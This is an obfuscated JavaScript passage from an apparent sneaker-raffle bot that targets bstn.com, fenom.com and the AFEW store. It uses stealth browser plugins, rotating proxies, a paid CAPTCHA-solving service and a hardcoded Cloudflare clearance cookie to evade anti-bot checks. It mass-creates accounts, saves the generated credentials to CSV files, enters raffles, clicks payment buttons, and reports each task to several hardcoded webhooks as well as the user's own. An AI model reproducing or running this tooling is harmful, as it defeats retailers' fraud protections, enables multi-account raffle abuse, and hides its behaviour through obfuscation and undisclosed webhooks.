            throw new Error('Login\x20session\x20expired\x20' + _0x28b39a);
        }
        for (var _0x8decc5 = 0x0; _0x8decc5 < _0x5e0847['length']; _0x8decc5++) {
            console['log'](_0x18cf54() + '\x20[' + _0x5a7330 + ']\x20Task\x20' + (_0x8decc5 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x992352(_0x5a7330 + '\x20Task\x20' + (_0x8decc5 + 0x1) + '\x20/\x20' + _0x5e0847['length']);
            const _0x1bd258 = await _0x20e2cc['newPage']();
            await _0x1bd258['goto']('' + _0x5e0847[_0x8decc5], { 'waitUntil': 'networkidle2' }), await _0x73378f(0xbb8);
            try {
                const _0x1781c1 = await _0x1bd258['$']('#challenge-heading');
                _0x1781c1 && (console['log'](_0x18cf54() + '\x20[' + _0x5a7330 + ']\x20Task\x20' + (_0x8decc5 + 0x1) + '\x20:\x20' + _0x5ecce5['yellow']('2FA\x20Required')), await _0x1bd258['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x73378f(0x61a8), await _0x1bd258['waitForSelector']('#payment-submit-btn'), await _0x1bd258['$eval']('#payment-submit-btn', _0x261945 => _0x261945['click']()), await _0x1bd258['click']('#payment-submit-btn');
                try {
                    await _0x1bd258['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x73378f(0x5dc), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x5a7330 + ']\x20Task\x20' + (_0x8decc5 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x3983f4) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x3983f4['message']);
                } finally {
                    await _0x1bd258['close'](), await _0x73378f(0x4650);
                }
            } catch (_0x5e1c10) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x5a7330 + ']\x20Task\x20' + (_0x8decc5 + 0x1) + '\x20:\x20' + _0x5e1c10));
            }
        }
    } catch (_0x3a58e0) {
        console['log'](_0x5ecce5['red']('' + _0x3a58e0));
    } finally {
        await _0x20e2cc['close']();
    }
}
async function _0x4cfe38(_0x5e3bab, _0x36c012, _0x18023b) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1bd1cf = 0x0; _0x1bd1cf < _0x5e3bab['length']; _0x1bd1cf++) {
        var _0x215907;
        await _0x3e6cb2(_0x5e3bab, _0x1bd1cf), _0x992352(_0x18023b['name'] + '\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20/\x20' + _0x5e3bab['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa);
        var _0x59e310 = await _0x3553d9(_0x5e3bab[_0x1bd1cf], _0x18023b, 'acc', ![]);
        const _0x539abc = { 'succesDEVMSG': { 'embeds': [_0x59e310] } }, _0x16891d = 'https://www.bstn.com/eu_en/customer/account/';
        var _0x13fab6 = Math['round'](Math['random']() * (_0x36c012['length'] - 0x1)), _0xd15240 = _0x36c012[_0x13fab6]['split'](':');
        const _0x3b201b = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0xd15240[0x0] + ':' + _0xd15240[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--force-device-scale-factor=0.3'
            ]
        });
        try {
            const _0x41b112 = await _0x3b201b['newPage']();
            await _0x41b112['authenticate']({
                'username': '' + _0xd15240[0x2],
                'password': '' + _0xd15240[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x41b112['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x41b112['setRequestInterception'](!![]), _0x41b112['on']('request', _0x25101e => {
                _0x25101e['resourceType']() === 'image' ? _0x25101e['abort']() : _0x25101e['continue']();
            }), await _0x41b112['goto']('' + _0x16891d), await _0x41b112['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x41b112['click']('button[class=\x22cf2Lf6\x22]'), await _0x41b112['waitForSelector']('a.action.create.primary.social-login'), console['log'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x73378f(0x7d0), await _0x41b112['click']('a.action.create.primary.social-login'), await _0x73378f(0x7d0), await _0x41b112['click']('button.button.dashboard-actions-toolbar__item'), console['log'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x73378f(0x190), await _0x41b112['type']('#firstname', _0x5e3bab[_0x1bd1cf]['FirstName'], { 'delay': 0xf0 }), await _0x73378f(0x190), await _0x41b112['type']('#lastname', _0x5e3bab[_0x1bd1cf]['LastName'], { 'delay': 0xe6 }), await _0x73378f(0x190), await _0x41b112['type']('#bss_email_address', _0x5e3bab[_0x1bd1cf]['Email'], { 'delay': 0x122 }), await _0x73378f(0x190), await _0x41b112['type']('#password', _0x5e3bab[_0x1bd1cf]['Password'], { 'delay': 0x1e0 }), console['log'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20:\x20Sending\x20Request'), await _0x73378f(0x2bc), await _0x41b112['click']('#bt-social-create'), await _0x41b112['click']('#bt-social-create'), await _0x73378f(0x1388);
            const _0x439727 = await _0x41b112['$']('#bss_email_address-error');
            if (_0x439727)
                throw new Error('Invalid\x20Email');
            const _0x1ac2ce = await _0x41b112['$']('#password-error');
            if (_0x1ac2ce)
                throw new Error('Invalid\x20Password');
            await _0x41b112['waitForSelector']('div.mesg-success'), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20:\x20Account\x20' + _0x5e3bab[_0x1bd1cf]['Email'] + '\x20Generated')), _0x536860['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5e3bab[_0x1bd1cf]['Email'] + ',' + _0x5e3bab[_0x1bd1cf]['Password']);
            try {
                _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x539abc['succesDEVMSG']);
            } catch {
            }
            await _0x278fc0(_0x10deb2, _0x539abc['succesDEVMSG']), console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
        } catch (_0x1e5ddf) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Task\x20' + (_0x1bd1cf + 0x1) + '\x20:\x20' + _0x1e5ddf)), _0x215907 = '' + _0x1e5ddf;
            var _0x4c4a3d = await _0x3553d9(_0x5e3bab[_0x1bd1cf], _0x18023b, 'acc', !![], _0x215907);
            _0x539abc['errorDEV'] = { 'embeds': [_0x4c4a3d] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x539abc['errorDEV']), await _0x278fc0(_0x51b669, _0x539abc['errorDEV']);
        } finally {
            _0x3b201b['close'](), console['log'](_0x18cf54() + '\x20[' + _0x18023b['name'] + ']\x20Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x9f879(_0x1e1453, _0x14c1d8, _0x383d77) {
    _0x4baac5['use'](_0x3f14b2());
    for (var _0x3a6bcc = 0x0; _0x3a6bcc < _0x1e1453['length']; _0x3a6bcc++) {
        var _0x534125 = Math['round'](Math['random']() * (_0x14c1d8['length'] - 0x1)), _0x491968 = _0x14c1d8[_0x534125]['split'](':');
        const _0x55c831 = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x491968[0x0] + ':' + _0x491968[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1d5245 = await _0x55c831['newPage']();
            await _0x1d5245['authenticate']({
                'username': '' + _0x491968[0x2],
                'password': '' + _0x491968[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x383d77['name'] + ']\x20Task\x20' + (_0x3a6bcc + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x1d5245['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1d5245['setRequestInterception'](!![]), _0x1d5245['on']('request', _0x502a03 => {
                _0x502a03['resourceType']() === 'image' || _0x502a03['resourceType']() === 'font' || _0x502a03['resourceType']() === 'media' ? _0x502a03['abort']() : _0x502a03['continue']();
            }), console['log'](_0x18cf54() + '\x20[' + _0x383d77['name'] + ']\x20Task\x20' + (_0x3a6bcc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1d5245['goto'](_0x1e1453[_0x3a6bcc]), console['log'](_0x18cf54() + '\x20[' + _0x383d77['name'] + ']\x20Task\x20' + (_0x3a6bcc + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x1d5245['waitForTimeout'](0xbb8);
            try {
                await _0x1d5245['waitForSelector']('.dashboard-main_title'), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x383d77['name'] + ']\x20Task\x20' + (_0x3a6bcc + 0x1) + '\x20:\x20Verification\x20Successful'));
                var _0x489b62 = await _0x3553d9(null, _0x383d77, 'ver', ![]);
                const _0x53fc53 = { 'succesDEVMSG': { 'embeds': [_0x489b62] } };
                await _0x278fc0(_0x1ea743, _0x53fc53['succesDEVMSG']);
            } catch (_0x68d787) {
                throw new Error(_0x68d787);
            }
        } catch (_0x231fe9) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x383d77['name'] + ']\x20Task\x20' + (_0x3a6bcc + 0x1) + '\x20:\x20' + _0x231fe9));
            var _0x403d27 = _0x231fe9, _0x12b9cb = await _0x3553d9(null, _0x383d77, 'ver', !![], _0x403d27);
            const _0x207b42 = { 'errorDEVMSG': { 'embeds': [_0x12b9cb] } };
            _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x207b42['errorDEVMSG']), await _0x278fc0(_0x51b669, _0x207b42['errorDEVMSG']);
        } finally {
            _0x55c831['close'](), console['log'](_0x18cf54() + '\x20[' + _0x383d77['name'] + ']\x20Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x3f49ef(_0x3b08ce, _0x3b5334, _0x418270) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3dcc31 = 0x0; _0x3dcc31 < _0x3b08ce['length']; _0x3dcc31++) {
        var _0x51f943;
        await _0x3e6cb2(_0x3b08ce, _0x3dcc31), _0x992352(_0x418270['name'] + '\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20/\x20' + _0x3b08ce['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa);
        var _0x1142ea = Math['round'](Math['random']() * (_0x3b5334['length'] - 0x1)), _0x49d4e7 = _0x3b5334[_0x1142ea]['split'](':'), _0x417f30;
        try {
            _0x417f30 = await _0x4baac5['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x49d4e7[0x0] + ':' + _0x49d4e7[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x417f30 = await _0x4baac5['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x49d4e7[0x0] + ':' + _0x49d4e7[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x4c53d8 = await _0x417f30['newPage'](), _0x4aebfc = await _0x4c53d8['target']()['createCDPSession'](), { windowId: _0x959a71 } = await _0x4aebfc['send']('Browser.getWindowForTarget');
            await _0x4c53d8['setViewport']({
                'width': 0x501,
                'height': 0x2d0
            });
            var _0x1b917f = [{
                'name': 'cf_clearance',
                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                'domain': '.bstn.com',
                'path': '/',
                'expires': 1707818183.331533,
                'httpOnly': !![],
                'secure': !![]
            }];
            await _0x4c53d8['authenticate']({
                'username': '' + _0x49d4e7[0x2],
                'password': '' + _0x49d4e7[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4c53d8['goto']('' + _0x3b08ce[_0x3dcc31]['Url']), console['log'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4c53d8['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x4aebfc['send']('Browser.setWindowBounds', {
                'windowId': _0x959a71,
                'bounds': { 'windowState': 'minimized' }
            }), await _0x73378f(0x1388), await _0x4c53d8['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4c53d8['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x73378f(0x1f4), console['log'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4c53d8['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x33c5f9 => _0x33c5f9['click']()), await _0x4c53d8['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4c53d8['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x73378f(0x7d0), await _0x4c53d8['waitForSelector']('#email-login'), await _0x4c53d8['type']('#email-login', '' + _0x3b08ce[_0x3dcc31]['Email']), await _0x73378f(0x1f4), await _0x4c53d8['waitForSelector']('#password'), await _0x4c53d8['type']('#password', '' + _0x3b08ce[_0x3dcc31]['Password']), await _0x73378f(0x1f4);
            try {
                await _0x4c53d8['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x523582 => _0x523582['click']()), await _0x4c53d8['click']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]');
            } catch {
            }
            try {
                await _0x4c53d8['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
            } catch (_0x42e82a) {
            }
            await _0x73378f(0x3e8);
            const _0x1d7b1f = await _0x4c53d8['$']('.enteredDraw_container__2KmQ_');
            if (_0x1d7b1f)
                throw new Error('Duplicate\x20Entry');
            console['log'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3b08ce[_0x3dcc31]['Size']);
            if (_0x3b08ce[_0x3dcc31]['Size'] != 'RANDOM') {
                var _0x3a3e74 = _0x3b08ce[_0x3dcc31]['Size']['replace']('.', ',');
                const _0x41dd36 = await _0x4c53d8['$x']('//div[contains(text(),\x20' + _0x3a3e74 + ')]');
                await _0x41dd36[0x0]['click']();
            } else {
                const _0x326b6a = await _0x4c53d8['$$']('div.swatchTile_tile__IRH9Q');
                var _0x57450a = Math['round'](Math['random']() * (_0x326b6a['length'] - 0x1));
                await _0x326b6a[_0x57450a]['click']();
            }
            await _0x73378f(0x1f4);
            const _0x5af78d = await _0x4c53d8['$']('.addressList_addressItem__LE2PB');
            if (_0x5af78d) {
            } else
                console['log'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x4c53d8['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x73378f(0x5dc), await _0x4c53d8['waitForSelector']('#firstname'), await _0x4c53d8['type']('#firstname', '' + _0x3b08ce[_0x3dcc31]['FirstName']), await _0x73378f(0x1f4), await _0x4c53d8['waitForSelector']('#firstname'), await _0x4c53d8['type']('#lastname', '' + _0x3b08ce[_0x3dcc31]['LastName']), await _0x73378f(0x1f4), await _0x4c53d8['waitForSelector']('#firstname'), await _0x4c53d8['type']('#street', '' + _0x3b08ce[_0x3dcc31]['Address1']), await _0x73378f(0x1f4), await _0x4c53d8['waitForSelector']('#firstname'), await _0x4c53d8['type']('#houseNumber', _0x3b08ce[_0x3dcc31]['HouseNumber'] + '\x20' + _0x3b08ce[_0x3dcc31]['Address2']), await _0x73378f(0x1f4), await _0x4c53d8['waitForSelector']('#firstname'), await _0x4c53d8['select']('#country_code', '' + _0x3b08ce[_0x3dcc31]['Country']), await _0x73378f(0x1f4), await _0x4c53d8['type']('#postcode', '' + _0x3b08ce[_0x3dcc31]['Zip']), await _0x73378f(0x1f4), await _0x4c53d8['type']('#city', '' + _0x3b08ce[_0x3dcc31]['City']), await _0x73378f(0x1f4), await _0x4c53d8['type']('#telephone', '' + _0x3b08ce[_0x3dcc31]['Phone']), await _0x73378f(0x1f4), await _0x4c53d8['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
            await _0x73378f(0x9c4);
            try {
                await _0x4c53d8['type']('#instagram_name', '' + _0x3b08ce[_0x3dcc31]['Follower']), await _0x4c53d8['click']('.note_groupBtn__WLDwH\x20>\x20button');
            } catch {
            }
            console['log'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x73378f(0x5dc), await _0x4c53d8['click']('.checkBox_boxHolder__wLGVe'), await _0x73378f(0x1f4), await _0x4c53d8['click']('.termConditions_TC__hll9k\x20>\x20button'), await _0x73378f(0x1388), await _0x4c53d8['waitForSelector']('.success_msg__2HjJY'), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            var _0x34f4b0 = await _0x3553d9(_0x3b08ce[_0x3dcc31], _0x418270, 'dev', ![]), _0x9dd419 = await _0x3553d9(_0x3b08ce[_0x3dcc31], _0x418270, 'pub', ![]);
            const _0x17b36c = {
                'succesDEVMSG': { 'embeds': [_0x34f4b0] },
                'succesPUBMSG': { 'embeds': [_0x9dd419] }
            };
            try {
                _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x17b36c['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x17b36c['succesDEVMSG']), await _0x73378f(0xc8), await _0x278fc0(_0x319480, _0x17b36c['succesPUBMSG']);
            } catch (_0x4ef885) {
                console['log'](_0x5ecce5['yellow'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4ef885));
            }
        } catch (_0x291318) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Task\x20' + (_0x3dcc31 + 0x1) + '\x20:\x20' + _0x291318)), _0x51f943 = '' + _0x291318;
            var _0x6f50a0 = await _0x3553d9(_0x3b08ce[_0x3dcc31], _0x418270, 'dev', !![], _0x51f943), _0x34f4b0 = await _0x3553d9(_0x3b08ce[_0x3dcc31], _0x418270, 'dev', ![]), _0x9dd419 = await _0x3553d9(_0x3b08ce[_0x3dcc31], _0x418270, 'pub', ![]);
            const _0x2d8acc = {
                'succesDEVMSG': { 'embeds': [_0x34f4b0] },
                'succesPUBMSG': { 'embeds': [_0x9dd419] }
            };
            _0x2d8acc['errorDEV'] = { 'embeds': [_0x6f50a0] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x2d8acc['errorDEV']), await _0x278fc0(_0x51b669, _0x2d8acc['errorDEV']);
        } finally {
            _0x417f30['close'](), console['log'](_0x18cf54() + '\x20[' + _0x418270['name'] + ']\x20Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x1ed827(_0x10424d, _0x2d1ae0, _0x4e42ac) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x24b5c2 = 0x0; _0x24b5c2 < _0x10424d['length']; _0x24b5c2++) {
        var _0x1fe5e8 = '', _0x381039 = 0x0, _0x1a0083;
        await _0x3e6cb2(_0x10424d, _0x24b5c2), _0x992352(_0x4e42ac['name'] + '\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20/\x20' + _0x10424d['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa);
        var _0x3e5d52 = await _0x3553d9(_0x10424d[_0x24b5c2], _0x4e42ac, 'acc', ![]);
        const _0x5182f1 = { 'succesDEVMSG': { 'embeds': [_0x3e5d52] } }, _0x223424 = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x208d68 = Math['round'](Math['random']() * (_0x2d1ae0['length'] - 0x1)), _0x40f8a7 = _0x2d1ae0[_0x208d68]['split'](':'), _0x30567e;
        try {
            _0x30567e = await _0x4baac5['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x40f8a7[0x0] + ':' + _0x40f8a7[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x30567e = await _0x4baac5['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x40f8a7[0x0] + ':' + _0x40f8a7[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
        try {
            const _0x34d874 = await _0x30567e['newPage']();
            await _0x34d874['setViewport']({
                'width': 0x500 + _0x45f419(0x1, 0x32),
                'height': 0x2d9 + _0x45f419(0x1, 0x32)
            });
            const _0x138340 = await _0x34d874['target']()['createCDPSession'](), { windowId: _0x47bc49 } = await _0x138340['send']('Browser.getWindowForTarget');
            await _0x34d874['authenticate']({
                'username': '' + _0x40f8a7[0x2],
                'password': '' + _0x40f8a7[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x34d874['goto']('' + _0x223424, { 'waitUntil': 'networkidle2' }), await _0x73378f(0x1388), console['log'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
            try {
                const _0x52b4d4 = await _0x34d874['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                _0x52b4d4 && await _0x52b4d4['click']();
            } catch {
            }
            await _0x138340['send']('Browser.setWindowBounds', {
                'windowId': _0x47bc49,
                'bounds': { 'windowState': 'minimized' }
            });
            try {
                await _0x34d874['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x73378f(0xfa0);
            } catch {
                throw new Error('Blocked\x20by\x20cloudflare');
            }
            console['log'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x34d874['type']('input[name=\x22firstname\x22]', '' + _0x10424d[_0x24b5c2]['FirstName']), await _0x73378f(0x1f4), await _0x34d874['type']('input[name=\x22lastname\x22]', '' + _0x10424d[_0x24b5c2]['LastName']), await _0x73378f(0x1f4), await _0x34d874['type']('input[name=\x22email\x22]', '' + _0x10424d[_0x24b5c2]['Email']), await _0x73378f(0x1f4), await _0x34d874['type']('input[name=\x22password\x22]', '' + _0x10424d[_0x24b5c2]['Password']), await _0x73378f(0x258), await _0x34d874['$eval']('input[name=\x22psgdpr\x22]', _0x1b523b => _0x1b523b['click']()), await _0x73378f(0x1f4), console['log'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x34d874['$eval']('#customer-form', _0x4ba6ad => _0x4ba6ad['submit']());
            try {
                await _0x34d874['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20:\x20Account\x20' + _0x10424d[_0x24b5c2]['Email'] + '\x20Generated')), _0x536860['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x10424d[_0x24b5c2]['Email'] + ',' + _0x10424d[_0x24b5c2]['Password']);
                try {
                    _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x5182f1['succesDEVMSG']);
                } catch {
                }
                await _0x278fc0(_0x10deb2, _0x5182f1['succesDEVMSG']);
            } catch (_0x3f05df) {
                throw new Error('Account\x20generation\x20failed:\x20' + _0x3f05df);
            }
        } catch (_0x860bb6) {
            console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20:\x20' + _0x860bb6)), _0x1a0083 = '' + _0x860bb6;
            var _0x51df30 = await _0x3553d9(_0x10424d[_0x24b5c2], _0x4e42ac, 'acc', !![], _0x1a0083);
            _0x5182f1['errorDEV'] = { 'embeds': [_0x51df30] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x5182f1['errorDEV']), await _0x278fc0(_0x51b669, _0x5182f1['errorDEV']), _0x1fe5e8 = 'yes';
        } finally {
            _0x30567e['close']();
            if (_0x1fe5e8 == 'yes' && _0x381039 != 0x5 && _0x1a0083 != 'Size\x20Not\x20Found') {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Task\x20' + (_0x24b5c2 + 0x1) + '\x20:\x20Retrying')), _0x24b5c2 = _0x24b5c2 - 0x1, _0x381039 = _0x381039 + 0x1;
                continue;
            }
            console['log'](_0x18cf54() + '\x20[' + _0x4e42ac['name'] + ']\x20Waiting\x20for\x20' + _0x5690b2['delay'] + '\x20ms'), await _0x73378f(_0x5690b2['delay']);
        }
    }
}
async function _0x478ef8(_0x3b3fac, _0x139a53, _0x2d6ecd) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x483d81 = 0x0; _0x483d81 < _0x3b3fac['length']; _0x483d81++) {
        var _0xee1c26 = '', _0x58d12b = 0x0, _0x52f65f;
        await _0x3e6cb2(_0x3b3fac, _0x483d81), _0x992352(_0x2d6ecd['name'] + '\x20Task\x20' + (_0x483d81 + 0x1) + '\x20/\x20' + _0x3b3fac['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa);
        const _0x27375c = 'https://www.fenom.com/en/authentication?create_account=1';
        var _0x196ed4 = Math['round'](Math['random']() * (_0x139a53['length'] - 0x1)), _0x3b0fa4 = _0x139a53[_0x196ed4]['split'](':'), _0x488a97;
        try {
            _0x488a97 = await _0x4baac5['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x3b0fa4[0x0] + ':' + _0x3b0fa4[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        } catch {
            _0x488a97 = await _0x4baac5['launch']({
                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                'headless': ![],
                'args': [
                    '--proxy-server=' + _0x3b0fa4[0x0] + ':' + _0x3b0fa4[0x1],
                    '--no-sandbox',
                    '--disable-setuid-sandbox'
                ]
            });
        }
